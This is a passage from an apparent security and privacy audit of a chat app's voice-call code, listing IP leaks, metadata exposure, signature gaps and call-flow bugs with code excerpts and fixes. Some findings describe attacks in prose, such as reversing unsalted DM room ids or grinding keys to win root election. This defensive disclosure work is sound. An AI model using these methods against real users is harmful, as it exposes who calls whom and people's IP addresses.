- The GC_LEAVE signed fields (`:11349-11356`) leave out `j` (joinGeneration). Yet `j` decides whether a leave applies (`:11381-11394`).

**Symptom [I].** Anyone who carries a GT or GL can change the cluster layout, or make a valid leave be ignored, without breaking the signature. That includes a forwarder on the path, or anyone using S-1. The impact is small today, because 15 participants or fewer always form a single cluster.

**Proof** (`group-call.ts:11473-11483`)

```ts
    this.enqueueVerify(
      {
        type: env.type,
        roomId: env.roomId,
        topologyEpoch: env.topologyEpoch,
        rootForwarder: env.rootForwarder,
        standbyForwarder: env.standbyForwarder,
        fromAddress: env.fromAddress,
        fromPublicKey: env.fromPublicKey,
        timestamp: env.timestamp,
      },
```

**Suggested fix**

- Add a signed `clustersHash` to GT and `joinGeneration` to GL, as a new versioned field set.
- Add a time window for GT.

**Compatibility.** Old Hubs rebuild the old field set and would reject the new signature. A transition therefore needs a second, optional signature field, or a version flag that old Hubs ignore. Keep the old signature until most peers have upgraded.

**GO.** GO signs and checks exactly today's field sets.

---

## 2. Privacy

### P-1. WebRTC sends every host and public candidate, and call windows have no IP-handling policy

- **Category:** privacy
- **Severity:** high. The code is [V]; the browser behaviour is [I].

**Where**

- All three PeerConnections are created with only `iceServers`, and every candidate is signalled unchanged:
  - `src/lib/call/directVoiceWebRtcTransport.ts:295` (`new RTCPeerConnection({ iceServers })`), candidates signalled at `:313-340`;
  - `src/lib/call/directScreenShareWebRtcTransport.ts:183`;
  - `src/lib/group-call/groupCallWebRtcDataChannelTransport.ts:328-337`.
- No `iceTransportPolicy` and no candidate filter anywhere.
- No `setWebRTCIPHandlingPolicy` for the main window or the audio-surface window in either ref. `develop` sets `disable_non_proxied_udp` only for Q-App guests (`electron/src/qapp-guest-network-policy.ts:4-8`, develop only).
- With 15 participants or fewer, every member's WebRTC edge goes to the root (`src/lib/group-call/groupCallTopology.ts:56-81`, `:204-214`).

**Symptom [I].** During a call the page holds microphone permission, so Chromium does not hide host candidates behind mDNS names. The other person receives your LAN addresses, VPN adapter addresses, global IPv6 addresses and public IPv4. In a group call the root receives all of this from everyone, and the root can be a stranger in an open group (P-7).

**Proof** (`directVoiceWebRtcTransport.ts:295`, then `:313` and `:328-340`, condensed)

```ts
const pc = new RTCPeerConnection({ iceServers });
pc.onicecandidate = (event) => {
  // …
  if (!this.generation || this.closed) return;
  const candidate = event.candidate.toJSON();
  if (this.localDescriptionSignalPending) {
    // … buffered, then sent the same way
    return;
  }
  this.queueLocalCandidate(this.generation, candidate);
};
```

**Suggested fix**

1. **Filter before signalling.** A small helper can wrap `RTCPeerConnection` once for all three transports. Before a candidate or the local SDP is signed:
   - drop `typ host`, and drop any candidate whose address is private, CGNAT, loopback, link-local, IPv6 unique-local, `.local` or unparseable;
   - on every candidate you keep (srflx, relay), set `raddr`/`rport` to `0.0.0.0` (or `::`) and `0`. On a srflx candidate they carry the LAN address, and with microphone permission Chromium no longer blanks them [I];
   - strip the matching `a=candidate` lines from `localDescription.sdp`;
   - replace a `c=` or `a=rtcp:` default address that is not one of the kept candidates with `0.0.0.0` (and the `m=` port with 9). Before STUN answers, the default address is the host address.

   Dropping host candidates alone still leaks the private IP through `raddr` and `c=`.

2. Call `setWebRTCIPHandlingPolicy('default_public_interface_only')` on the webContents that create call PeerConnections.
3. Offer a user setting (P-4) and a TURN option (P-5).

**Compatibility.** Hub already accepts partial candidate sets, and falls back to Reticulum media per call or edge when ICE fails. Filtering before signing keeps signatures valid. The trade-off: two devices on the same LAN may lose the direct LAN path and use the STUN-mapped path or Reticulum instead.

**GO.** GO does all of step 1 for every PeerConnection in its WebView. It also drops srflx candidates on IPv6, and applies only the peer's public IPv4 candidates, so its ICE checks cannot reveal its LAN, CGNAT or IPv6 address as a peer-reflexive candidate ("How GO interoperates", item 1).

---

### P-2. 1:1 call signalling (caller, callee, timing) is flooded to every overlay Hub as readable JSON

- **Category:** privacy
- **Severity:** high [V]

**Where**

- Three sends go through the flood:
  - CALL_REQUEST, `call.ts:1530`;
  - CALL_ACCEPT, `:1575` (on top of 5 pinned copies);
  - the CALL_HANGUP fallback, `:1757`.
- All three call `sendEnvelope`, then `sendEnvelopeWhenReady` (`:2666-2694`).
  - `attachReticulumOverlayMeta` adds `U: targetAddress` (`:2700-2711`).
  - `broadcastReticulumOverlayWire` calls `fanoutCallDetailed` (`:2754-2760`).
  - Python's `handle_fanout_call` sends to **all** established overlay neighbours (v3.0.3 `:25388`, neighbours at `:25449` / develop `:25648`, `:25709`).
- Every Hub that receives the frame floods it again (`:2316-2325`).
- The CALL_REQUEST wire carries `c, a, k, g, m, r` (`encodeCallWire`, `:168-188`).
- The comment at `:1569-1574` calls this path a "targeted overlay".

**Symptom.** Every Hub within 4 hops reads, in application-level cleartext:

- caller address, public key and Reticulum destination;
- callee address (`U`);
- call id;
- the times of request, accept and hang-up.

Over time this builds a who-calls-whom graph of the network. Reticulum encrypts each hop, so outsiders on the wire cannot read it, but every relaying Hub can.

**Proof** (`call.ts:2684-2693`)

```ts
const overlayWire = this.attachReticulumOverlayMeta(
  encodeCallWire(env),
  targetAddress,
  CALL_MAX_HOPS
);
if (!wireFitsReticulum(overlayWire)) {
  loggerWarn('[Call] Skipping Reticulum call send: wire exceeds limit');
  return;
}
this.broadcastReticulumOverlayWire(overlayWire);
```

**Suggested fix**

- Also send CALL_REQUEST pinned to the callee's known destinations. `initiateCall` already looks up those routes (`:1487-1500`), and `sendPinnedCallWireWhenReady` already exists.
  - **Do not use `sendToCall` for CR as it is.** It sends `encodeCallWire(env)` without the overlay fields (`:2439-2457`). A direct-chat CR has no `H` (`:182-186`), and the decoder needs `H` or `U` (`:245-251`), so every 3.0.x receiver would drop that pinned copy.
  - Send the same overlay wire instead: the signed frame with `U` and the same `X`. The receiver decodes it through `U` and dedupes it against the flood copy by `X` (`:2316-2318`).
  - Choose `L` on purpose. With the flood's `L`, whichever copy reaches the callee first is relayed like a flood copy (`:2319-2325`), so the callee's other devices are still reached; GO does this. With `L: 0` the pinned copy is never relayed.
- Keep the overlay flood alongside the pinned copies, not only as a fallback. A pinned send that succeeds at the transport level does not prove the receiver could decode it, and some Hubs are only reachable through the overlay. Demote the flood only once all receivers can decode a pinned CR and a ringing acknowledgement (X-3) exists.
- Longer term: seal the overlay copy to the callee, for example an X25519 box to the callee's public key (both sides already convert Ed25519 keys this way for room keys), and route on an opaque tag instead of a clear `U`.

**Compatibility.** A pinned CR that keeps `U` decodes on every 3.0.x receiver. A sealed overlay frame would be a new, optional format; keep sending today's frame for one release.

**GO.** GO never re-floods other people's CALL*\* frames. Its own CR goes pinned (with `U`, and the flood's `X` and `L`) and by flood. Its other CALL*\* frames come from your `CallManager` unchanged.

---

### P-3. Group and DM-voice join/leave frames are flooded to every Hub, and the DM voice room id can be reversed

- **Category:** privacy
- **Severity:** high [V]

**Where**

- `group-call.ts:4172-4207`: `fanoutReticulumWire` and `fanoutReticulumWireAsync` discard `roomId`, `targetAddresses` and `excludeAddresses` (`:4179-4180`, `:4199-4201`) and broadcast to the whole overlay.
- This path carries GJ+GI (`:5523-5528`, `:5539-5544`) and GL (`:5609-5614`).
- GA computes the member target set (`:4566`) but floods anyway (`:4584`).
- Python sends to all neighbours (`handle_fanout_group_call`, v3.0.3 `:25583`/`:25641` / develop `:25843`/`:25901`).
- GJ carries room, chat id, address, public key and Reticulum destination (`group-call-wire-reticulum.ts:126-155`), and GI adds the RNS identity key.
- DM voice uses the same `joinRoom` path. The DM room id is `'dmv:' + sha256('direct:' + sorted(A, B))[0:18]` (`src/lib/call/directVoiceReticulumMedia.ts:22-24`, chat id at `call.ts:164-166`), and it is unsalted.

**Symptom**

- Every overlay Hub learns who is in which group's call, including private groups, together with their Reticulum identity.
- Every overlay Hub also learns which pairs of accounts are in a DM voice call. From GJ `{a: A, R: 'dmv:X'}`, a relay can test every known Qortal address B offline until `sha256('direct:' + sorted(A, B))` starts with `X`.

**Proof** (`group-call.ts:4199-4207`)

```ts
void roomId;
void targetAddresses;
void excludeAddresses;
const overlayFrames = frames.map((frame) =>
  this.attachReticulumOverlayMeta(frame)
);
const firstFailure =
  await this.broadcastReticulumFramesViaOverlay(overlayFrames);
```

**Suggested fix**

- Send GJ, GI and GL to the room roster and the member allowlist (`qortalReticulumTargetsByRoomId` is already there) and over room links. Keep the flood only as a last-resort fallback.
- For DM rooms, derive the room id from a secret that relays cannot compute, instead of from the two addresses. For example: hash the X25519 shared secret of the two wallet keys (both sides already convert Ed25519 keys to Curve25519 for room keys, and each side has the other's public key once CALL_ACCEPT arrives) together with `callId`. `callId` alone is not enough, because every relaying Hub reads it (P-2). `callSessionId` cannot be used either: `joinRoom` returns it (`group-call.ts:5288`), so it does not exist before the room id is needed.

**Compatibility.** Direct delivery already works with every receiver. Changing the DM room id needs versioning, because old peers compute the old id. Gate it behind the capability exchange, or keep the old id for old peers.

**GO.** GO sends its own GJ and GI exactly as Hub does, and never re-floods other people's frames ("How GO interoperates", item 3).

---

### P-4. There is no "Reticulum only" (hide my IP) setting; WebRTC is a compile-time choice

- **Category:** privacy
- **Severity:** medium [V]

**Where**

- `src/lib/call/directVoiceCallTransport.ts:8`: `isReticulumCallEnabled = false`.
- `src/lib/group-call/groupCallTransport.ts:6`: `isReticulumGroupCallEnabled = false`.
- The hook prefers WebRTC whenever `window.groupCall.sendRtcSignal` exists (`src/hooks/useVoiceCall.ts:448-452`).

**Symptom.** A user who does not want to share their IP with the people they call cannot turn WebRTC off.

**Suggested fix.** Add a user setting "Private calls (Reticulum only)". When it is on, read it where the two constants are read today: do not start RTC, and do not send or acknowledge a capability.

**Compatibility.** Peers already stay on Reticulum when the other side never acknowledges the capability. For DM calls that takes about 33 s of retries (`useVoiceCall.ts:1102-1150`).

**GO.** GO has this setting ("How GO interoperates", item 2).

---

### P-5. There is no relay (TURN) or user-defined ICE server option

- **Category:** privacy
- **Severity:** medium [V]

**Where.** ICE servers come only from community STUN (`stun-coordinator.ts:243-270`). The URLs are built only as `stun:` (`electron/src/stun-cache.ts:399`, `electron/src/stun-bootstrap.ts:36`). There is no TURN server and no user-configured server anywhere (git grep).

**Symptom.**

- WebRTC is always a direct UDP path between the two devices (or between the root and a member), so it always shows each side's public IP to the other.
- There is no "relay only" mode.
- Peers behind symmetric NATs cannot use WebRTC at all.

**Suggested fix.**

- Let users add their own STUN or TURN servers (`{urls, username, credential}`).
- Add an option `iceTransportPolicy: 'relay'`.
- Community TURN could follow the STUN contribution model, opt-in.

**Compatibility.** Local only.

**GO.** GO has no TURN either. Its "relay" is Reticulum, through the Private calls setting.

---

### P-6. Community STUN contribution is on by default (UPnP, public IP announced), and anyone can announce endpoints

- **Category:** privacy
- **Severity:** medium. The code is [V]; the effects are [I].

**Where**

- **Default on.** `electron/src/setup.ts` v3.0.3 `:1799`, `:1837-1838` / develop `:1982`, `:2020-2021`: a missing setting counts as `true`. The opt-out toggle is in `src/components/Group/HomeProfileCard.tsx`.
- **Contribution** (`startContribution`, from `stun-coordinator.ts:449`):
  - binds UDP 47321;
  - maps that port on the router with UPnP (`:480-484`);
  - reads the router's external IP (`:485-488`);
  - advertises it (`:640-644`) through Python `_announce_community_stun_endpoint` (v3.0.3 `:9192` / develop `:9256`).

  The advertisement uses a separate anonymous identity, rotated every 24 h (v3.0.3 `:54-59` / develop `:56-61`).

- **Discovery.** Any identity can announce any global IPv4 on port 47321. `CommunityStunAnnounceHandler` checks only global address, port and expiry (v3.0.3 `:9098-9105` / develop `:9162-9169`). Every Hub probes announced endpoints (`stun-coordinator.ts:300-317`, `:388-430`, up to 18 probes a minute at `:33`) and uses the best 6 for every call (`:30`, `:243-270`).

**Symptom**

1. A default install opens a port on the user's router and publishes the home IP to the mesh. The IP is not tied to the Qortal address directly, but timing can link the two.
2. [I] A malicious contributor sees the public IP of every Hub that probes it. Once it is in a Hub's top 6, it sees both sides of a call send STUN Binding requests at the same moment, so it can pair calls by timing and IP.
3. [I] Announcing someone else's IP makes Hubs send that address probes (rate-limited).

**Proof** (`stun-coordinator.ts:480-488`)

```ts
const mapped = await mapUdpPort(client, {
  publicPort: STUN_FIXED_UDP_PORT,
  privatePort: STUN_FIXED_UDP_PORT,
  description: 'Qortal Hub Community STUN',
});
const externalIp =
  mapped && typeof client.externalIp === 'function'
    ? String(await client.externalIp()).trim()
    : '';
```

**Suggested fix**

- Make contribution opt-in, with one short explanation the first time.
- Require proof-of-work or a reputation before using an announced endpoint.
- Pick one or two servers per call at random, instead of the same top 6 every time.
- Allow user-defined STUN and TURN (P-5).
- Discovery itself also needs fixing: most endpoint announces never get past the transport nodes (B-15).

**Compatibility.** The wire is unchanged.

**GO.** GO never contributes and never answers discovery queries. It uses at most 6 community endpoints per call. The build we lab-tested used only endpoints inside their announce lease, without probing them. **(built, not lab-tested yet)** GO now keeps heard endpoints for 24 h and uses a cached one only after it answered a probe. It sends at most one query announce every 10 min, and no probes at all in Private calls ("How GO interoperates", item 7, and B-15).

---

### P-7. Group root election is a fixed public hash, so a stranger in an open group can grind their way to root

- **Category:** privacy / security
- **Severity:** medium. The code is [V]; the attack is [I].

**Where**

- `src/lib/group-call/election-order.ts:19-27`, and runtime `computeElectionOrder` (`groupCallAudioEngineRuntime.ts:8163-8178`): the order is ascending `sha256(address + ':' + roomId)`.
- With 15 participants or fewer, the root is the lowest digest (`groupCallTopology.ts:56-81`).
- The room id is public and never changes: `gcall-qortal-<groupId>` (`group-call.ts:4299-4304`).

**Symptom [I].** Someone generates key pairs offline until `sha256(address + ':gcall-qortal-<id>')` beats the usual members. Beating N members takes about N tries. They join the open group and are then root of that group's calls whenever they are present. The root:

- receives every participant's WebRTC candidates (P-1);
- forwards, and could drop or delay, all audio;
- distributes the room key.

**Proof** (`election-order.ts:19-27`)

```ts
export function syncRootElectionDigestHex(
  rootAddress: string,
  roomId: string
): string {
  const input = `${rootAddress.trim()}:${roomId.trim()}`;
  const shaObj = new jsSHA('SHA-256', 'TEXT', { encoding: 'UTF8' });
  shaObj.update(input);
  return shaObj.getHash('HEX');
}
```

**Suggested fix.**

- Mix an unpredictable per-call value into the digest, for example the first verified `callSessionId`.
- Or prefer long-standing members or admins as root.
- Add an opt-out hint (X-2).

**Compatibility.** Every peer must compute the same election, so this needs a versioned topology rule.

**GO.** GO follows the current election exactly, including acting as root when elected. When the phone is forwarding, GO shows the user a small "You're relaying audio" note.

---

### P-8. Opus VBR without padding, plus the RTP audio-level header on the native track

- **Category:** privacy
- **Severity:** low. The code is [V]; the browser behaviour is [I].

**Where**

- The WebCodecs Opus configs set no `bitrateMode` (`src/lib/group-call/configureWebCodecsOpusEncoderForGcall.ts:18-33`, `src/lib/group-call/groupCallAudioSenderEngine.ts:699-716`), so the spec default `variable` applies.
- Packets are `nonce || secretbox(inner)` with no padding (`src/lib/group-call/audioPacketCodec.ts:86-130`).
- There is no SDP munging anywhere: no `extmap`, `cbr` or `setCodecPreferences`.

**Symptom [I]**

- Packet sizes follow the speech. On-path observers, and the forwarder, can use that to see who is talking, and research has shown phrase recognition from it.
- For the native 1:1 WebRTC track, Chromium normally negotiates the RTP audio-level header extension, which SRTP leaves unencrypted.

**Suggested fix**

- On the Reticulum path, set `bitrateMode: 'constant'`, or pad packets to a few fixed sizes.
- On native RTP, set `cbr=1` in the Opus fmtp and drop the `ssrc-audio-level` extmap, or negotiate encrypted header extensions.

**Compatibility.** Receivers are not affected.

**GO.** GO uses the same shared encoder code.

---

## 3. Bugs

### B-1. The call readiness gate blocks calls for the first 15 s and whenever CPU is above 65%

- **Category:** bug
- **Severity:** high [V]

**Where**

- `src/hooks/useVoiceCall.ts:413-430`, used by `startCall` (`:3552`) and `acceptCall` (`:3688`).
- `electron/src/system-call-readiness.ts`:
  - the first snapshot is `status: 'unknown'` (`:25-32`);
  - sampling happens only every 15 s, with no sample at start (`:18`, `:161-167`);
  - `'warning'` above 65% CPU or 200 ms of main-loop lag (`:20`, `:22`, `:127-138`).
- The IPC handler returns the cached snapshot and never calls `refreshSystemCallReadinessSnapshot` (setup.ts v3.0.3 `:1454-1456` / develop `:1567-1569`).

**Symptom**

- For about 15 s after Hub starts, every outgoing call and every accept fails with "Your system is too busy for calls right now".
- The same happens whenever the machine averaged more than 65% CPU over the last 15 s, for example during a Core sync, a compile or a game.
- Any build without `electronAPI` can never call.
- The message is hard-coded English.

**Proof** (`useVoiceCall.ts:413-420`)

```ts
async function isSystemReadyForCall(
  showError: (message: string) => void
): Promise<boolean> {
  const readiness = await window.electronAPI?.getSystemCallReadiness?.();
  if (!readiness || readiness.status !== 'good') {
    showError(
      'Your system is too busy for calls right now. Close other apps and try again.'
    );
```

**Suggested fix**

- Block only on `'blocked'`. Treat `'unknown'`, `'warning'` and a missing API as allowed; for `'warning'`, show a soft hint instead.
- Call `refreshSystemCallReadiness()` (it already exists in preload) when the cached snapshot is `'unknown'`.
- Translate the string.

**Compatibility.** Local only.

**GO.** GO has no Electron readiness API, and treats its absence as "allowed".

---

### B-2. Unanswered calls never end in the UI (no event when the 60 s timeout fires)

- **Category:** bug
- **Severity:** high [V]

**Where**

- The caller's timer (`call.ts:1520-1527`) and the callee's timer (`:1823-1831`) delete the call record and emit only `call:history`.
- `setup.ts` forwards only `incoming`, `accepted`, `rejected`, `hangup` and `rtc-signal` to the renderer, and sends `call:history` to the chat store (v3.0.3 `:6393-6406` / develop `:7116-7129`). Nothing reaches the renderer when the timeout fires.
- The hook has no ring timeout: the outbound ringtone plays for as long as the state is `'calling'` (`useVoiceCall.ts:3466-3474`).
- After the timeout, `hangUp` returns early because the record is gone (`call.ts:1719-1720`), so the caller's Cancel never reaches the callee.

**Symptom.** If nobody answers, the caller hears the ringback, and the callee sees the incoming card and hears the ringtone, until each user clicks something. Accept after 60 s fails silently.

**Proof** (`call.ts:1520-1527`)

```ts
record.cleanupTimer = setTimeout(() => {
  if (this.activeCalls.get(callId)?.state === 'pending') {
    loggerLog(`[Call] Request ${callId.slice(0, 8)}… timed out.`);
    this.emitDirectCallHistory(record, 'no_answer');
    this.activeCalls.delete(callId);
    this.clearRtcSignalsForCall(callId);
  }
}, CALL_REQUEST_TTL_MS);
```

**Suggested fix**

- In both timers, also `this.emit('call:hangup', { callId, reason: 'timeout' })`.
- For outbound calls, send the pre-signed cancellation (`cancellationSignature`) to the invited endpoints before deleting the record.

**Compatibility.** Local, plus an existing signed message.

**GO.** GO ends its own ringing or calling state after 60 s.

---

### B-3. The group member allowlist is frozen at join time

- **Category:** bug
- **Severity:** high [V]

**Where**

- Members are fetched once, when the user clicks join (`src/components/Group/Group.tsx:1213-1262`).
- They are pushed to the main process only during join (`groupCallAudioEngineRuntime.ts:5358`, then `syncQortalGroupReticulumTargets` at `:9479-9524`).
- `memberGateRefreshTimer` is declared (`:1120`) and cleared (`:9526-9531`), but never set.
- The old 90 s refresh exists only in `src/hooks/useGroupVoiceCall.ts:12840-12853`, which no module imports (B-14).
- The main process rejects every address that is not on the list (`group-call.ts:3130-3158`), and prunes only when the list is set again.

**Symptom**

- Someone who joins the Qortal group after I joined the call is ignored by my Hub until I leave and rejoin: no key, and no topology with me.
- A member kicked or banned during the call is never pruned.

**Suggested fix.** Refresh every 60–90 s, and on `GROUP_*` chain events, call `setQortalGroupReticulumTargets` again.

**Compatibility.** Local only.

**GO.** GO refreshes the allowlist from its node every 60 s while a call is active.

---

### B-4. The group DataChannel keeps "sending" while ICE is disconnected, with no Reticulum fallback

- **Category:** bug
- **Severity:** medium. The code is [V]; the timing is [I].

**Where**

- `src/lib/group-call/groupCallWebRtcDataChannelTransport.ts:156-166`: `send()` checks only `readyState` and a 256 KiB buffer.
- The router uses Reticulum only when `send()` returns false (`groupCallAudioEngineRuntime.ts:11232-11254`).
- After `disconnected`, recovery waits 8 s (`:29`, `:339-356`).
- Compare the 1:1 transport, whose `isOpen()` requires `connectionState === 'connected'` (`directVoiceWebRtcTransport.ts:101-103`).

**Symptom [I].** A DataChannel stays `open` while ICE is `disconnected`, and SCTP queues the data locally. At about 5–10 kB/s of Opus, it takes tens of seconds to fill 256 KiB. So after a Wi-Fi to mobile switch, or a NAT rebind, the other side hears silence for 8 s or more, and the Reticulum fallback never starts.

**Proof** (`groupCallWebRtcDataChannelTransport.ts:156-160`)

```ts
  send(packet: Uint8Array): boolean {
    const channel = this.channel;
    if (!channel || channel.readyState !== 'open') return false;
    if (channel.bufferedAmount > 256 * 1024) return false;
    try {
```

**Suggested fix**

- Return false when `this.pc?.connectionState !== 'connected'`.
- Lower the buffer threshold to about 16–32 KiB (under 0.5 s of audio).
- Optionally, send over both paths for a few seconds after a state flap.

**Compatibility.** Local only.

**GO.** GO runs the same shared transport.

---

### B-5. CALL_REQUEST is sent once, by overlay flood only

- **Category:** bug
- **Severity:** medium [V]

**Where**

- `call.ts:1529-1530`: one `sendEnvelope`, which is the overlay flood.
- Only accept, reject and hangup are repeated or pinned. CALL_ACCEPT, for example, is pinned 5 times every 350 ms (`:73-74`).
- `initiateCall` requires a Reticulum route (`:1487-1500`), but the request is never sent pinned to those routes.

**Symptom.** One lost flood means an unanswered call. Phones waking from Doze, or lossy mesh paths, miss the call completely.

**Suggested fix**

- Also send the CR pinned to each invited endpoint, keeping the flood. The pinned copy must be the overlay wire: the same signed frame with `U` and the same `X` (for `L`, see P-2). `sendToCall` drops `U`, and a direct-chat CR has no `H`, so 3.0.x receivers cannot decode a CR sent through it (see P-2).
- Re-flood it with a fresh `X` every 3–5 s during the 60 s ring window.

**Compatibility.** A pinned CR that keeps `U` decodes on every 3.0.x receiver. Receivers drop the second copy of the same `X` (`:2316-2318`), and repeats with a fresh `X` by `callId` (`:1804`).

**GO.** GO sends its CR both pinned (with `U`, and the flood's `X` and `L`) and flooded. Like Hub, it sends the CR only once.

---

### B-6. A busy callee silently ignores a second incoming call

- **Category:** bug
- **Severity:** medium [V]

**Where.** `src/hooks/useVoiceCall.ts:3342`: `if (callStateRef.current !== 'idle') break;`. No reject is sent.

**Symptom.** The caller rings until the timeout, which with B-2 means forever. The callee sees nothing.

**Suggested fix.** Auto-reject with reason `busy`. The signing policy allows reasons up to 32 characters. Map `busy` in `finalizeRejectedCall` (`call.ts:2020`, reason mapping at `:2038-2046`), and translate the string.

**Compatibility.** Old Hubs map unknown reasons to "declined".

**GO. (planned)** Auto-reject with reason `busy`, and show the user a short call-waiting notice.

---

### B-7. CALL_REJECT has no overlay fallback

- **Category:** bug
- **Severity:** medium [V]

**Where.** `call.ts:1603-1621` uses only `sendToCall`. Accept (`:1575`) and hangup (`:1756-1757`) also flood.

**Symptom.** When the direct link back to the caller cannot be admitted (for example, the caller's inbound link limit is full), the caller never learns about the decline. With B-2 it then stays on "calling".

**Suggested fix.** After the pinned pair, also `sendEnvelope(call.remoteAddress, legacyEnv)`. The caller already accepts CX only from invited endpoints.

**Compatibility.** Compatible.

**GO.** GO runs your `CallManager` here unchanged, so it sends the same reason-signed + legacy pair and has the same gap.

---

### B-8. The multi-device cancellation stops working 30 s after the request

- **Category:** bug
- **Severity:** medium. The code is [V]; the effect is [I].

**Where**

- The cancellation CALL_HANGUP is pre-signed with the **request** timestamp (`useVoiceCall.ts:3582-3597`).
- `cancelOtherRingingEndpoints` sends it after an accept (`call.ts:2597-2622`).
- Receivers verify CALL\_\* with `skew > 30_000` meaning reject (`electron/src/ed25519-verify-common.ts:211-212`).

**Symptom.** If the callee answers more than 30 s after the call started, the callee's other devices reject the cancellation and keep ringing until their own 60 s timeout.

**Suggested fix.**

- Have the caller's renderer sign a fresh CALL_HANGUP at accept time and use that.
- Or pre-sign two or three cancellations with later timestamps.

**Compatibility.** A fresh signature verifies on every 3.0.x receiver.

**GO.** Nothing GO-specific.

---

### B-9. Python drops reliable control frames that arrive on a "non-canonical" audio link

- **Category:** bug
- **Severity:** medium. The code is [V]; the effect is [I].

**Where**

- Reliable Channel messages are fed into the same receive function as lossy packets (`_handle_group_audio_control_channel_message`, v3.0.3 `:20451-20470` / develop `:20710-20729`).
- That function returns early when the link is not the canonical one for the peer (v3.0.3 `:20063-20066` / develop `:20322-20325`).
- Each side picks the canonical link mainly by its own _local activity_ timestamps, and the deterministic hash rule is only a tie-break (`_audio_link_pick_keep`, v3.0.3 `:18462-18492` / develop `:18721-18751`).

**Symptom [I].** When both ends open a link at once (allowed in group rooms), they can disagree about which link is canonical. RTC offers, answers and candidates that RNS already acknowledged are then thrown away. The capability or ICE exchange stalls until the next retry.

**Suggested fix**

- Never drop control frames on canonical grounds; `_inspect_gcall_audio_payload` already classifies them.
- Make the keep rule deterministic first (for example, by presence hash and direction) and use activity only as a tie-break.

**Compatibility.** Local only.

**GO.** GO runs your group-call code and the same Python functions, so DM and group rooms on GO have the same exposure as Hub.

---

### B-10. Link-auth is sent once as a lossy packet, control frames get the 320 ms media deadline, and early control is dropped

- **Category:** bug
- **Severity:** medium. The code is [V]; the effect is [I].

**Where**

- **Link-auth is sent once.** `sendReticulumAudioLinkAuth` marks link-auth as sent as soon as it is queued, and never resends on that link (`group-call.ts:7913`, `:7926`). It is sent as a lossy link packet via `enqueueGroupAudio`, even after the reliable Channel exists.
- **Control frames get the media deadline.**
  - The bridge stamps every queued frame, control included, with `receivedAtWallMs = queuedAtMs` (`reticulum-bridge.ts` v3.0.3 `:2820`, `:4173` / develop `:2843`, `:4281`).
  - Python drops any outbound frame older than 320 ms (`_AUDIO_OUTBOUND_DEADLINE_SECONDS`, v3.0.3 `:838` / develop `:849`; `_filter_outbound_audio_deadline`, v3.0.3 `:4501-4522` / develop `:4541-4562`).
  - The filter is applied at v3.0.3 `:5346`, `:5663` / develop `:5386`, `:5717`.
- **Early control is dropped.** On the receiving side, control from a link that has not passed link-auth yet is dropped, not buffered (`group-call.ts:12228-12242`).

**Symptom [I].** Under main-process load, or with one lost packet, the peer never gets this Hub's link-auth. It then drops all control from the link (keys, RTC signals) and closes it after about 10 s. The call setup stalls and starts again with a new link.

**Suggested fix**

- Resend link-auth until the peer shows evidence of acceptance (its own link-auth, a GK, a GQ or a PONG).
- Send link-auth, GK and GQ over the Channel once GCC1 is acknowledged.
- Set `receivedAtWallMs: 0` for control frames, or exempt `QGCCTL1` frames from the deadline in Python.
- Buffer a few control frames per link while link-auth is pending.

**Compatibility.** Local only.

**GO.** GO's adapter sends link control frames with `receivedAtWallMs: 0`, so its Python never applies the media deadline to them. Link-auth itself is your send-once logic, unchanged, in DM and group rooms.

---

### B-11. Signature time windows are tight and differ by message type

- **Category:** bug
- **Severity:** medium [V]

**Where**

| Message         | Window                | Code                                                    |
| --------------- | --------------------- | ------------------------------------------------------- |
| CALL\_\*        | 10 s ahead, 30 s old  | `ed25519-verify-common.ts:211-212`, `call.ts:2382-2386` |
| GC_RTC_SIGNAL   | ±20 s                 | `group-call.ts:116`, `:5251`                            |
| GC_JOIN         | 30 s ahead, 210 s old | `:221-226`, `:502`                                      |
| GA              | 7 s old               | `:244`                                                  |
| DM link control | ±30 s                 | `:5081`                                                 |

**Symptom [I].** A device whose clock is more than 10 s fast cannot place or answer 1:1 calls. More than 20 s of skew silently disables WebRTC. Phones with manual time hit this, and the user sees no reason.

**Suggested fix.**

- Use one shared window (for example ±60 s) with the replay caches that already exist.
- Log, and show, a "check your clock" hint when frames are dropped for skew.

**Compatibility.** Wider windows on receivers are compatible.

**GO. (planned)** Warn the user when the phone clock is off by more than a few seconds, checked against the node's time.

---

### B-12. `capture-processor.js` uses a bare `instanceof SharedArrayBuffer`

- **Category:** bug
- **Severity:** low [V]

**Where.** `public/worklets/capture-processor.js:99-106`. The other files already guard it: for example `group-playout-processor.js:122` uses `typeof SharedArrayBuffer !== 'undefined'`.

**Symptom.** Where `SharedArrayBuffer` is not defined (any page that is not cross-origin isolated, for example if the audio window loses its COOP/COEP headers), `set-frame-port` throws a ReferenceError and worker capture dies.

**Suggested fix.** Use the same `typeof` guard.

**Compatibility.** Local only.

**GO.** GO carries this fix.

---

### B-13. Hard-coded English in the call UI

- **Category:** bug (i18n)
- **Severity:** low [V]

**Where**

- `useVoiceCall.ts:419` (system busy) and `:3990-4023` (startup headlines: "Calling...", "Connecting...", "Connected").
- `src/components/Chat/DirectVoiceCallGlobalOverlay.tsx:146` ("Incoming voice call") and `:171` ("Direct message").
- `src/contexts/CallSwitchGuardContext.tsx:281`.

**Suggested fix.** Move these to `core:voice_call.*` keys.

**GO.** GO's phone call screens use translated strings.

---

### B-14. Dead code, docs drift and type drift in the call area

- **Category:** bug (code health)
- **Severity:** low [V]

**Where**

- **Half-dead 1:1 RTC path.** DM WebRTC uses `window.groupCall.sendRtcSignal`. The older `call.ts` RTC path is only half unused:
  - **Outbound is unused.** No renderer calls `window.call.sendRtcSignal` (`CallManager.sendRtcSignal`, `call.ts:731`) in either ref (git grep).
  - **Inbound is live.** `onReticulumCallWire` hands every call wire to `handleRtcWire` first (`call.ts:2225`, defined at `:1055`). A frame that passes there is emitted as `call:rtc-signal` (`:1349-1354`) and forwarded to the main shell (`setup.ts` v3.0.3 `:6397-6403` / develop `:7120-7126`). `window.call.onEvent` subscribes to it (`preload.ts` v3.0.3 `:3813` / develop `:3980`). `useVoiceCall.ts` applies it to the screen-share and direct-voice transports (`case 'call:rtc-signal'` at `:3210`, subscribed at `:3443-3444`).
  - The wallet signing policy still allows `CALL_RTC_SIGNAL` (`src/background/reticulum-signing-policy.ts:169`, `:914`).

  Hub itself never originates these frames, so only an outside sender can use the inbound path. Removing `handleRtcWire`, the `call:rtc-signal` forwarding and the policy entry reduces attack surface.

- **Unused files.** No module imports `src/hooks/useGroupVoiceCall.ts` (15,470 lines) in either ref (git grep); `src/contexts/GroupCallContext.tsx:16` also notes that the provider does not use it. `src/components/Group/DirectVoiceCallDock.tsx` and `QortalGroupVoiceCallDock.tsx` are also never imported.
